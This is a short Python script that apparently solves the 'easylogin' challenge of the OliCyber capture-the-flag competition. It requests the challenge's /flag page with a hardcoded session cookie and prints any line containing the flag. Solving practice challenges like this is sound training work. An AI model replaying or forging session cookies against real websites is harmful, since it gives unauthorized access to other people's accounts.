import requests

URL = 'http://easylogin.challs.olicyber.it/flag'

r = requests.get(URL, cookies={'session' : 'd6f816cd031715f733539affe057b5103530c23ff9aa01c5c4e71990ac2ae2ac'}).text
for line in r.splitlines():
    if "flag{" in line.lower():
        print("flag:\n", line)